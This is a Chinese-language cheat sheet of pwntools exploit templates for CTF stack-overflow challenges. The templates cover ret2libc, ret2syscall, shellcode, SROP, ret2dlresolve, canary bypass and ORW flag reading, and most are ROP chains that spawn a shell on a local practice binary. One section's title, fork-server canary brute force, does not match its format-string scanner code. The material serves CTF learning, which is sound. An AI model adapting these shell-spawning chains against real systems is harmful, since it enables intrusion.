---
title: "pwn栈溢出题型模板"
lastmod: 2026-04-26T23:41:31+08:00
draft: false
---
# Pwn 栈溢出题型模板

这份文档按“题型 -> 判断条件 -> 利用思路 -> pwntools 模板”整理。真实做题时不要死套，先 `checksec`、看输入函数、确认位数、确认偏移，再决定用哪一类模板。

## 0. 通用检查流程

```bash
file ./pwn
checksec --file=./pwn
strings -a ./pwn | grep -E "sh|flag|cat|/bin"
readelf -h ./pwn
readelf -S ./pwn
readelf -s ./pwn | grep -E "system|puts|read|write|main"
objdump -d -Mintel ./pwn | less
ROPgadget --binary ./pwn | grep -E "pop rdi|pop rsi|pop rdx|pop eax|pop ebx|int 0x80|syscall"
```

重点看：

- `Arch`：i386 还是 amd64。
- `Canary`：是否有栈保护。
- `NX`：是否能执行栈上 shellcode。
- `PIE`：程序基址是否随机。
- `RELRO`：GOT 能不能改。
- `输入函数`：`gets/read` 常常能塞 `\x00`，`scanf("%s")` 会被空白截断，字符串函数会被 `\x00` 截断。

## 1. 通用 pwntools 骨架

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
# libc = ELF("./libc.so.6")

LOCAL = True

if LOCAL:
    io = process("./pwn")
else:
    io = remote("host", 12345)

def sla(delim, data):
    return io.sendlineafter(delim, data)

def sa(delim, data):
    return io.sendafter(delim, data)

def ru(delim):
    return io.recvuntil(delim)

def lg(name, value):
    log.success(f"{name}: {hex(value)}")

offset = 0
payload = b"A" * offset

io.sendline(payload)
io.interactive()
```

## 2. 找溢出偏移模板

### cyclic 找偏移

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = process("./pwn")
io.sendline(cyclic(300))
io.wait()

core = io.corefile
crash_value = core.read(core.rsp, 8)
offset = cyclic_find(crash_value)
print(offset)
```

32 位常看 `eip`：

```python
offset = cyclic_find(core.eip)
```

64 位如果 `rip` 没被直接填成 cyclic，常从 `rsp` 读返回地址：

```python
offset = cyclic_find(core.read(core.rsp, 8))
```

### 手算偏移

如果反汇编看到：

```asm
sub esp, 0x18
lea eax, [ebp-0x18]
call gets
```

32 位返回地址在 `ebp+4`，偏移：

```text
0x18 + 4 = 28
```

如果 64 位缓冲区在 `[rbp-0x40]`，返回地址在 `rbp+8`，偏移：

```text
0x40 + 8 = 72
```

## 3. ret2text

适用：

- 程序里有后门函数，比如 `backdoor`、`win`、`get_shell`。
- 能覆盖返回地址。
- PIE 关闭，或者能泄露程序基址。

### 32 位

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

elf = ELF("./pwn")
io = process("./pwn")

offset = 28
win = elf.symbols["win"]

payload = flat(
    b"A" * offset,
    win,
)

io.sendline(payload)
io.interactive()
```

### 64 位

64 位有时需要加一个 `ret` 做栈对齐。

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
io = process("./pwn")

offset = 72
ret = 0x40101a
win = elf.symbols["win"]

payload = flat(
    b"A" * offset,
    ret,
    win,
)

io.sendline(payload)
io.interactive()
```

## 4. ret2shellcode

适用：

- NX 关闭。
- 栈、bss、heap 等区域可执行，或者可以通过 `mprotect` 改权限。
- 能知道 shellcode 地址，或者程序会把地址打印出来。

### 栈上执行 shellcode

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

io = process("./pwn")

offset = 112
buf_addr = 0xffffd120

sc = asm(shellcraft.sh())
payload = sc.ljust(offset, b"A") + p32(buf_addr)

io.sendline(payload)
io.interactive()
```

### 64 位 shellcode

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = process("./pwn")

offset = 120
buf_addr = 0x7fffffffe000

sc = asm(shellcraft.sh())
payload = sc.ljust(offset, b"A") + p64(buf_addr)

io.sendline(payload)
io.interactive()
```

### 受限字符 shellcode

如果不能出现 `\x00`、`\x0a`，先检查：

```python
bad = [b"\x00", b"\x0a", b" "]
for c in bad:
    assert c not in payload
```

## 5. ret2libc 32 位

适用：

- NX 开启。
- 动态链接。
- 能拿到 libc 地址，或者本地远程 libc 一致。
- 32 位函数参数通过栈传递。

### 已知 libc base

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
io = process("./pwn")

offset = 112
libc_base = 0xf7d00000

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
exit_addr = libc_base + libc.symbols["exit"]

payload = flat(
    b"A" * offset,
    system,
    exit_addr,
    bin_sh,
)

io.sendline(payload)
io.interactive()
```

### 32 位泄露 libc 后二次利用

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
io = process("./pwn")

offset = 112

payload = flat(
    b"A" * offset,
    elf.plt["puts"],
    elf.symbols["main"],
    elf.got["puts"],
)

io.sendline(payload)
puts_addr = u32(io.recv(4))
libc_base = puts_addr - libc.symbols["puts"]

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
exit_addr = libc_base + libc.symbols["exit"]

payload = flat(
    b"A" * offset,
    system,
    exit_addr,
    bin_sh,
)

io.sendline(payload)
io.interactive()
```

## 6. ret2libc 64 位

适用：

- NX 开启。
- 动态链接。
- amd64 参数通过寄存器传递，`system("/bin/sh")` 需要控制 `rdi`。

### 64 位泄露 libc + system

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
io = process("./pwn")

offset = 72
pop_rdi = 0x401233
ret = 0x40101a

payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)

io.sendlineafter(b"input:", payload)

puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = puts_addr - libc.symbols["puts"]

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    bin_sh,
    system,
)

io.sendlineafter(b"input:", payload)
io.interactive()
```

### 64 位 one_gadget

```python
one_gadget_offset = 0x4f2a5
one = libc_base + one_gadget_offset

payload = flat(
    b"A" * offset,
    ret,
    one,
    p64(0) * 20,
)

io.sendline(payload)
io.interactive()
```

注意：`one_gadget` 必须看 constraints，不满足就换 gadget 或补 NULL、调栈对齐。

## 7. ret2syscall 32 位

适用：

- 静态链接 32 位程序。
- 有足够 gadget。
- 目标是执行 `execve("/bin/sh", 0, 0)`。

系统调用号：

```text
eax = 0xb
ebx = "/bin/sh"
ecx = 0
edx = 0
int 0x80
```

### 程序里已有 `/bin/sh`

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

io = process("./pwn")

offset = 28
pop_eax = 0x080b81c6
pop_ebx = 0x080481c9
pop_ecx = 0x080de955
pop_edx = 0x0806f02a
int_80 = 0x0806cc25
bin_sh = 0x080be408

payload = flat(
    b"A" * offset,
    pop_eax, 0xb,
    pop_ebx, bin_sh,
    pop_ecx, 0,
    pop_edx, 0,
    int_80,
)

io.sendline(payload)
io.interactive()
```

### read 写入 `/bin/sh` 到 bss

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

io = process("./pwn")

offset = 28
bss = 0x080eb000

pop_eax = 0x080b81c6
pop_ebx = 0x080481c9
pop_ecx = 0x080de955
pop_edx = 0x0806f02a
int_80 = 0x0806cc25

payload = flat(
    b"A" * offset,
    pop_eax, 3,
    pop_ebx, 0,
    pop_ecx, bss,
    pop_edx, 8,
    int_80,
    pop_eax, 0xb,
    pop_ebx, bss,
    pop_ecx, 0,
    pop_edx, 0,
    int_80,
)

io.sendline(payload)
sleep(0.1)
io.send(b"/bin/sh\x00")
io.interactive()
```

### 用 mov gadget 写 `/bin//sh`

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

io = process("./pwn")

offset = 28
writable = 0x080eaf80 + 0x100

pop_eax = 0x080b81c6
pop_edx_ecx_ebx = 0x0806f050
mov_edx_eax = 0x080549db
int_80 = 0x0806cc25

payload = b"A" * offset

payload += flat(pop_edx_ecx_ebx, writable, 0, 0)
payload += flat(pop_eax, b"/bin")
payload += flat(mov_edx_eax)

payload += flat(pop_edx_ecx_ebx, writable + 4, 0, 0)
payload += flat(pop_eax, b"//sh")
payload += flat(mov_edx_eax)

payload += flat(pop_eax, 0xb)
payload += flat(pop_edx_ecx_ebx, 0, 0, writable)
payload += flat(int_80)

io.sendline(payload)
io.interactive()
```

## 8. ret2syscall 64 位

适用：

- 静态链接 64 位程序。
- 有 `syscall` gadget。

`execve("/bin/sh", 0, 0)`：

```text
rax = 59
rdi = "/bin/sh"
rsi = 0
rdx = 0
syscall
```

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = process("./pwn")

offset = 72
bss = 0x404800

pop_rax = 0x401001
pop_rdi = 0x401002
pop_rsi = 0x401003
pop_rdx = 0x401004
syscall = 0x401005

payload = flat(
    b"A" * offset,
    pop_rax, 0,
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, 8,
    syscall,
    pop_rax, 59,
    pop_rdi, bss,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,
)

io.sendline(payload)
sleep(0.1)
io.send(b"/bin/sh\x00")
io.interactive()
```

## 9. ret2plt 泄露地址

适用：

- 动态链接。
- 有 `puts@plt` 或 `write@plt`。
- 需要泄露 libc 地址。

### puts 泄露

```python
payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)

io.sendline(payload)
puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = puts_addr - libc.symbols["puts"]
```

### write 泄露

```python
payload = flat(
    b"A" * offset,
    pop_rdi, 1,
    pop_rsi, elf.got["read"],
    pop_rdx, 8,
    elf.plt["write"],
    elf.symbols["main"],
)

io.sendline(payload)
read_addr = u64(io.recv(8))
libc_base = read_addr - libc.symbols["read"]
```

## 10. PIE 开启

适用：

- PIE 开，程序地址随机。
- 需要泄露程序内地址，计算 `elf.address`。

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
io = process("./pwn")

leak = int(io.recvline().strip(), 16)
elf.address = leak - elf.symbols["main"]

log.success(f"elf_base: {hex(elf.address)}")

pop_rdi = elf.address + 0x1233
ret = elf.address + 0x101a
win = elf.symbols["win"]

payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    0xdeadbeef,
    win,
)

io.sendline(payload)
io.interactive()
```

如果泄露的是某个函数实际地址：

```python
elf.address = leak_func - elf.symbols["func"]
```

## 11. Canary 绕过

适用：

- Canary 开启。
- 可以泄露 canary，或者可以逐字节爆破。
- payload 必须把 canary 原样放回去。

64 位 canary 通常最低字节是 `\x00`。

### 泄露 canary 后覆盖

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
io = process("./pwn")

offset = 72

io.sendafter(b"name:", b"A" * (offset + 1))
io.recvuntil(b"A" * (offset + 1))
canary = u64(b"\x00" + io.recv(7))
log.success(f"canary: {hex(canary)}")

ret = 0x40101a
win = elf.symbols["win"]

payload = flat(
    b"A" * offset,
    canary,
    b"B" * 8,
    ret,
    win,
)

io.sendlineafter(b"input:", payload)
io.interactive()
```

### fork server 逐字节爆破 canary

适用：远程每次崩溃后子进程重启，canary 不变。

```python
from pwn import *

import re

  

context(os="linux", arch="i386", log_level="error")

  

prompt = b"Try Bypass Me!"

start = 1

end = 80

  
  

def send_first(io, payload):

    io.sendafter(prompt, payload)

  
  

# 格式化字符串爆破模板：每个偏移跑两次，先找会变的值，再重点看末尾是 00 的项

for i in range(start, end + 1):

    values = []

  

    for _ in range(2):

        io = process("./pwn")

        send_first(io, f"%{i}$p\n".encode())

        data = io.recvrepeat(0.3).decode(errors="ignore")

        io.close()

  

        m = re.search(r"0x[0-9a-fA-F]+|\(nil\)", data)

        values.append(m.group(0) if m else "(empty)")

  

    text1 = values[0]

    text2 = values[1]

  

    v1 = int(text1, 16) if text1.startswith("0x") else None

    v2 = int(text2, 16) if text2.startswith("0x") else None

  

    flag = ""

    if text1 != text2 and v1 is not None and v2 is not None:

        flag += "  <== changed"

    if text1 == text2 and v1 is not None and 0x08040000 <= v1 <= 0x09000000:

        flag += "  <== possible binary addr"

    if text1 != text2 and v1 is not None and v2 is not None and (v1 & 0xff) == 0 and (v2 & 0xff) == 0:

        flag += "  <== possible canary"

  

    print(f"{i:02d}: {text1} | {text2}{flag}")
```

## 12. 栈迁移 stack pivot

适用：

- 第一次可控空间太短。
- 可以往 `.bss` 或堆里写入更长 ROP。
- 有 `leave; ret` 或 `pop rsp; ret`。

`leave; ret` 等价于：

```asm
mov rsp, rbp
pop rbp
ret
```

### 64 位 leave; ret 迁移到 bss

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
io = process("./pwn")

bss = 0x404800
offset = 72
leave_ret = 0x401234
pop_rdi = 0x401233

rop2 = flat(
    b"BBBBBBBB",
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)

io.sendafter(b"data:", rop2)

payload = flat(
    b"A" * offset,
    bss,
    leave_ret,
)

io.sendlineafter(b"input:", payload)
io.interactive()
```

注意：使用 `leave; ret` 时，新栈开头通常要放一个假的 `rbp`。

### pop rsp; ret 迁移

```python
payload = flat(
    b"A" * offset,
    pop_rsp,
    bss,
)
```

## 13. ret2csu

适用：

- 64 位程序缺少 `pop rdi; pop rsi; pop rdx` 等 gadget。
- 程序里有 `__libc_csu_init`。
- 想调用 `read/write/puts` 等函数。

常见 csu gadget 结构：

```text
gadget1:
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

gadget2:
mov rdx, r15
mov rsi, r14
mov edi, r13d
call qword ptr [r12 + rbx*8]
```

模板：

```python
def ret2csu(call_addr_ptr, rdi, rsi, rdx, ret_addr):
    return flat(
        csu_pop,
        0,          # rbx
        1,          # rbp, rbp = rbx + 1
        call_addr_ptr,
        rdi,
        rsi,
        rdx,
        csu_call,
        b"A" * 8,   # add rsp, 8
        0, 0, 0, 0, 0, 0,
        ret_addr,
    )

payload = b"A" * offset
payload += ret2csu(
    elf.got["write"],
    1,
    elf.got["read"],
    8,
    elf.symbols["main"],
)
```

有些程序的 csu 结构略有差异，必须对着反汇编调参数。

## 14. SROP

适用：

- 有 `syscall` 或 `int 0x80`。
- 能控制 `rax` 为 `SYS_rt_sigreturn`。
- 可构造 `SigreturnFrame`。

64 位 `rt_sigreturn` 系统调用号是 15。

### amd64 SROP execve

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = process("./pwn")

offset = 72
syscall = 0x401005
pop_rax = 0x401001
bss = 0x404800

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = bss
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = flat(
    b"A" * offset,
    pop_rax,
    15,
    syscall,
    bytes(frame),
)

io.sendline(payload)
sleep(0.1)
io.send(b"/bin/sh\x00")
io.interactive()
```

常见变体：先 SROP 调 `read(0, bss, 0x400)`，再迁移到 bss 执行第二段 ROP。

## 15. ret2dlresolve

适用：

- 动态链接。
- 没有 libc 泄露，或者泄露困难。
- Partial RELRO 更常见。
- 可以向 `.bss` 写入伪造的解析结构。

pwntools 有 `Ret2dlresolvePayload`。

### 32 位 ret2dlresolve

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

elf = ELF("./pwn")
rop = ROP(elf)
io = process("./pwn")

offset = 112
bss = elf.bss() + 0x800

dlresolve = Ret2dlresolvePayload(
    elf,
    symbol="system",
    args=["/bin/sh"],
    data_addr=bss,
)

rop.read(0, bss, len(dlresolve.payload))
rop.ret2dlresolve(dlresolve)

payload = flat(
    b"A" * offset,
    rop.chain(),
)

io.sendline(payload)
io.send(dlresolve.payload)
io.interactive()
```

### 64 位 ret2dlresolve

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
rop = ROP(elf)
io = process("./pwn")

offset = 72
bss = elf.bss() + 0x800

dlresolve = Ret2dlresolvePayload(
    elf,
    symbol="system",
    args=["/bin/sh"],
    data_addr=bss,
)

rop.read(0, bss, len(dlresolve.payload))
rop.ret2dlresolve(dlresolve)

payload = flat(
    b"A" * offset,
    rop.chain(),
)

io.sendline(payload)
io.send(dlresolve.payload)
io.interactive()
```

如果自动生成失败，多半是 `read` 参数、栈对齐、可写地址、payload 长度出问题。

## 16. mprotect + shellcode

适用：

- NX 开启。
- 能 ROP 调 `mprotect` 或 syscall。
- 想把 `.bss`、栈、堆改成可执行，再跳 shellcode。

### 64 位 syscall mprotect

`mprotect(addr, len, prot)`：

```text
rax = 10
rdi = page_start
rsi = 0x1000
rdx = 7
syscall
```

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = process("./pwn")

offset = 72
bss = 0x404800
page = bss & ~0xfff

pop_rax = 0x401001
pop_rdi = 0x401002
pop_rsi = 0x401003
pop_rdx = 0x401004
syscall = 0x401005

sc = asm(shellcraft.sh())

payload = flat(
    b"A" * offset,
    pop_rax, 0,
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, len(sc),
    syscall,
    pop_rax, 10,
    pop_rdi, page,
    pop_rsi, 0x1000,
    pop_rdx, 7,
    syscall,
    bss,
)

io.sendline(payload)
sleep(0.1)
io.send(sc)
io.interactive()
```

## 17. ORW 读 flag

适用：

- 禁用了 `execve`，比如 seccomp 只允许 `open/read/write`。
- 目标不是拿 shell，而是读 flag。

### amd64 ORW syscall

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = process("./pwn")

offset = 72
bss = 0x404800

pop_rax = 0x401001
pop_rdi = 0x401002
pop_rsi = 0x401003
pop_rdx = 0x401004
syscall = 0x401005

payload = flat(
    b"A" * offset,
    # read(0, bss, 0x20), write "flag\x00" into bss
    pop_rax, 0,
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, 0x20,
    syscall,
    # open(bss, 0, 0)
    pop_rax, 2,
    pop_rdi, bss,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,
    # read(3, bss+0x100, 0x100)
    pop_rax, 0,
    pop_rdi, 3,
    pop_rsi, bss + 0x100,
    pop_rdx, 0x100,
    syscall,
    # write(1, bss+0x100, 0x100)
    pop_rax, 1,
    pop_rdi, 1,
    pop_rsi, bss + 0x100,
    pop_rdx, 0x100,
    syscall,
)

io.sendline(payload)
sleep(0.1)
io.send(b"flag\x00")
io.interactive()
```

如果远程 flag 路径不同，试：

```text
flag
./flag
/flag
/home/ctf/flag
```

## 18. 32 位参数传递模板

32 位 cdecl 调用：

```text
func(arg1, arg2, arg3)
```

ROP 栈布局：

```text
func_addr
return_addr
arg1
arg2
arg3
```

示例：

```python
payload = flat(
    b"A" * offset,
    elf.plt["write"],
    elf.symbols["main"],
    1,
    elf.got["read"],
    4,
)
```

如果要连续调用多个 32 位函数，有时需要清理栈的 gadget：

```text
pop pop pop ret
add esp, 0xc; ret
```

模板：

```python
payload = flat(
    b"A" * offset,
    elf.plt["read"],
    pop3_ret,
    0,
    bss,
    8,
    elf.plt["system"],
    0xdeadbeef,
    bss,
)
```

## 19. 64 位参数传递模板

amd64 System V ABI：

```text
rdi = arg1
rsi = arg2
rdx = arg3
rcx = arg4
r8  = arg5
r9  = arg6
```

常见调用：

```python
payload = flat(
    b"A" * offset,
    pop_rdi, 1,
    pop_rsi, elf.got["puts"],
    pop_rdx, 8,
    elf.plt["write"],
)
```

如果没有 `pop rdx; ret`，考虑：

- `ret2csu`
- `ROP(elf).find_gadget(...)`
- 借助 libc gadget
- SROP

## 20. GOT 覆写

适用：

- Partial RELRO 或 No RELRO。
- 有任意写，或可以调用 `read(0, got, size)`。
- 想把 `puts@got`、`printf@got`、`exit@got` 改成 `system` 或后门。

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
io = process("./pwn")

offset = 72
pop_rdi = 0x401233
pop_rsi = 0x401231
pop_rdx = 0x401234
ret = 0x40101a

system = 0x7ffff7e12345

payload = flat(
    b"A" * offset,
    pop_rdi, 0,
    pop_rsi, elf.got["puts"],
    pop_rdx, 8,
    elf.plt["read"],
    elf.symbols["main"],
)

io.sendline(payload)
io.send(p64(system))

payload = flat(
    b"A" * offset,
    pop_rdi,
    next(elf.search(b"/bin/sh")),
    elf.plt["puts"],
)

io.sendline(payload)
io.interactive()
```

实际题目里 GOT 覆写经常和格式化字符串、堆题结合；纯栈溢出题要看是否能构造 `read` 写 GOT。

## 21. puts 泄露不完整的处理

64 位地址常只有 6 字节有效：

```python
leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
```

如果输出后有换行：

```python
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
```

如果是 32 位：

```python
leak = u32(io.recv(4))
```

如果泄露混在文本里：

```python
io.recvuntil(b"addr: ")
leak = int(io.recvline().strip(), 16)
```

## 22. 常见架构差异速查

### i386

```text
返回地址：4 字节
参数：通过栈传递
syscall：int 0x80
execve syscall number：0xb
p32()
```

### amd64

```text
返回地址：8 字节
参数：rdi, rsi, rdx, rcx, r8, r9
syscall：syscall
execve syscall number：59
p64()
栈对齐：常需要 ret
```

## 23. 常见保护与打法

| 保护情况 | 常见打法 |
| --- | --- |
| NX 关 | ret2shellcode |
| NX 开，动态链接 | ret2libc |
| NX 开，静态链接 | ret2syscall |
| PIE 开 | 先泄露程序地址，再算基址 |
| Canary 开 | 先泄露或爆破 canary |
| Full RELRO | 不能改 GOT，考虑 ret2libc、ROP、ORW |
| Partial RELRO | 可考虑 GOT 覆写 |
| seccomp 禁 execve | ORW |
| payload 空间短 | stack pivot |
| 缺少参数 gadget | ret2csu、SROP |
| 无 libc 泄露 | ret2dlresolve |

## 24. 远程与本地 libc 不一致

本地调试：

```bash
ldd ./pwn
```

使用指定 libc：

```bash
pwninit
```

pwntools 指定 loader：

```python
io = process(["./ld-linux-x86-64.so.2", "./pwn"], env={
    "LD_PRELOAD": "./libc.so.6",
})
```

或者：

```python
io = process("./pwn", env={"LD_PRELOAD": "./libc.so.6"})
```

## 25. GDB 调试模板

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")

gdbscript = """
set disassembly-flavor intel
b *main
continue
"""

io = gdb.debug("./pwn", gdbscript=gdbscript)

payload = b"A" * 72
io.sendline(payload)
io.interactive()
```

断在返回前：

```gdb
b *0x401234
x/40gx $rsp
i r
```

## 26. 常见错误排查

### payload 没打到返回地址

- 重新算 offset。
- 检查输入是否被长度限制。
- 检查是否被 `\x00`、空格、换行截断。

### 本地能打远程不能打

- libc 不一致。
- 远程路径不同。
- 交互同步问题，需要 `sendlineafter`。
- 第二阶段 payload 发太快，可以 `sleep(0.1)`。

### ret2libc 崩在 system

- 64 位栈没对齐，前面加 `ret`。
- `/bin/sh` 地址算错。
- libc base 算错。

### one_gadget 崩溃

- constraints 不满足。
- 换另一个 one_gadget。
- 加 `ret` 对齐。
- payload 后补 `p64(0) * 20`。

### 泄露地址不对

- 接收长度不对。
- 输出里有提示文本干扰。
- 32 位和 64 位用了错误的 `u32/u64`。
- GOT/PLT 符号选错。

## 27. 最短决策树

```text
1. 先 checksec。
2. 没 canary -> 直接找 offset。
3. 有 canary -> 先泄露或爆破 canary。
4. NX 关 -> shellcode。
5. NX 开 + 动态链接 -> ret2libc。
6. NX 开 + 静态链接 -> ret2syscall。
7. PIE 开 -> 先泄露基址。
8. 没有足够 gadget -> ret2csu / SROP。
9. 不能 execve -> ORW。
10. payload 太短 -> 栈迁移。
11. 没 libc 泄露 -> ret2dlresolve。
```

## 28. 做题记录模板

````markdown
# 题目名

## 保护

```text
checksec 结果
```

## 漏洞点

- 输入函数：
- 缓冲区大小：
- offset：
- 是否可泄露：

## 利用思路

1. 泄露：
2. 计算：
3. getshell / ORW：

## 关键地址

```text
pop rdi:
ret:
puts@plt:
puts@got:
main:
libc_base:
system:
/bin/sh:
```

## exploit

```python
from pwn import *
```
````

## 29. 常用命令合集

```bash
# 信息
file ./pwn
checksec --file=./pwn
ldd ./pwn

# 字符串和符号
strings -a ./pwn | grep "/bin/sh"
strings -a libc.so.6 | grep "/bin/sh"
readelf -s libc.so.6 | grep system

# gadget
ROPgadget --binary ./pwn | grep "pop rdi"
ROPgadget --binary ./pwn | grep "syscall"
ROPgadget --binary ./pwn | grep "int 0x80"
ROPgadget --binary ./pwn --ropchain

# one_gadget
one_gadget libc.so.6
one_gadget libc.so.6 --raw

# 调试
gdb -q ./pwn
cyclic 300
cyclic -l 0x6161616b
```

## 30. 最常用完整模板：64 位 ret2libc

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

elf = ELF("./pwn")
libc = ELF("./libc.so.6")

LOCAL = True
if LOCAL:
    io = process("./pwn")
else:
    io = remote("host", 12345)

offset = 72
pop_rdi = 0x401233
ret = 0x40101a

payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)

io.sendlineafter(b"input:", payload)

puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = puts_addr - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

log.success(f"puts: {hex(puts_addr)}")
log.success(f"libc_base: {hex(libc_base)}")
log.success(f"system: {hex(system)}")
log.success(f"bin_sh: {hex(bin_sh)}")

payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    bin_sh,
    system,
)

io.sendlineafter(b"input:", payload)
io.interactive()
```

## 31. 最常用完整模板：32 位 ret2syscall

```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

io = process("./pwn")
# io = remote("host", 12345)

offset = 28
bss = 0x080eb000

pop_eax = 0x080b81c6
pop_ebx = 0x080481c9
pop_ecx = 0x080de955
pop_edx = 0x0806f02a
int_80 = 0x0806cc25

payload = flat(
    b"A" * offset,
    pop_eax, 3,
    pop_ebx, 0,
    pop_ecx, bss,
    pop_edx, 8,
    int_80,
    pop_eax, 0xb,
    pop_ebx, bss,
    pop_ecx, 0,
    pop_edx, 0,
    int_80,
)

io.sendlineafter(b"input:", payload)
sleep(0.1)
io.send(b"/bin/sh\x00")
io.interactive()
```

## 32. 最常用完整模板：ORW

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = process("./pwn")

offset = 72
bss = 0x404800

pop_rax = 0x401001
pop_rdi = 0x401002
pop_rsi = 0x401003
pop_rdx = 0x401004
syscall = 0x401005

payload = flat(
    b"A" * offset,
    pop_rax, 0,
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, 0x20,
    syscall,
    pop_rax, 2,
    pop_rdi, bss,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,
    pop_rax, 0,
    pop_rdi, 3,
    pop_rsi, bss + 0x100,
    pop_rdx, 0x100,
    syscall,
    pop_rax, 1,
    pop_rdi, 1,
    pop_rsi, bss + 0x100,
    pop_rdx, 0x100,
    syscall,
)

io.sendline(payload)
sleep(0.1)
io.send(b"flag\x00")
io.interactive()
```

